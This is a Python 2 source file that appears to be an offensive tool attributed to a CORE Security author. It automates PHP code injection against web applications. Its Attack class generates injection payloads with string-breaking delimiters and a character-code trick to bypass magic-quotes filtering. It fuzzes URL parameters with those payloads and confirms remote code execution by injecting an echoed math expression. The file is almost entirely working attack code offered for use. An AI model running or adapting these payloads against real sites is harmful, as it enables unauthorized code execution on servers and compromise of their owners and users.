#--
#
# Description:
#       This tool is used to exploit poorly sanitized user input in PHP 
#       web applications. 
#
#       Author: Level @ CORE Security Technologies, CORE SDI Inc.
#       Email: level@coresecurity.com
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#--

import urllib, urllib2, random
class Attack:
	def strings(self):
		letters = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
		return letters[random.randrange(0,25)]*random.randrange(50,100)
		
	def bypass_magic_dect(self):
		bym = "$a = array("
		for i in Attack().strings(): bym += "%s," % (ord(i))
		bym=bym[:-1]
		bym += "); for ($i=0;$i<count($a);$i++) { $b[$i] = chr($a[$i]); } echo implode($b);"
		return bym	

	def fuzz_gen(self,params):
		php_split,list = [';',"';",'";','");',"');",'\n";',"\n';","\r\n';",'\r\n";','\r\n";',"\r\n';","';\n';",'";\n";','";";',"';';",'"];',"'];",'");];',"');];",'"]"];',"']'];"],[]
		for key in params.iterkeys():
			list.append(urllib.urlencode({'%s' % (key):'%s' % (str(params[key])+'%s' % (Attack().bypass_magic_dect()))}))
			list.append(urllib.urlencode({'%s' % (key):'%s' % (str(params[key])+'<?php %s ?>' % (Attack().bypass_magic_dect()))}))
		for key in params.iterkeys():
			for split in php_split:
				list.append(urllib.urlencode({'%s' % (key):'%s%s' % (str(params[key])+split,'%s' % (Attack().bypass_magic_dect()))}))
		return list
		
	def vuln_detect(self,url,paramFuzz):
		targetList = []
		for fuzz in paramFuzz:
			targetList.append("%s?%s" % (url,fuzz))
			for target in targetList:
				length = len(urllib2.unquote(target.split("=")[1].split("echo")[0].split("array")[1][3:-118]).split(","))
				char = urllib2.unquote(target.split("=")[1].split("echo")[0].split("array")[1][3:-118]).split(",")[0]
				dectRand = chr(int(char))*length
			try:
				page = urllib2.urlopen(target)
				if dectRand in page.read():
					print "[*] host is potentially vulnerable.."
					return True, target
			except:
				continue
		return False, None
		
	def reduce_false(self,target):
		''' detection isnt 100% for some reason '''
		base = target.split("?")[0]
		paramName = target.split("?")[1].split("=")[0]
		one,two,three,four = random.random(),random.random(),random.random(),random.random()
		answer = one / two + three * four
		print "[*] injecting math equation.."
		try:
			page = urllib2.urlopen("%s?%s=%s%s" % (base,paramName,target.split("=")[1][:urllib.unquote(target.split("=")[1]).find(";")+3],urllib.quote("echo %s / %s + %s * %s;" % (one,two,three,four))))
			if str(answer) in page.read():
				print "[*] host is vulnerable"
				return True
		except:
			return False
		return False
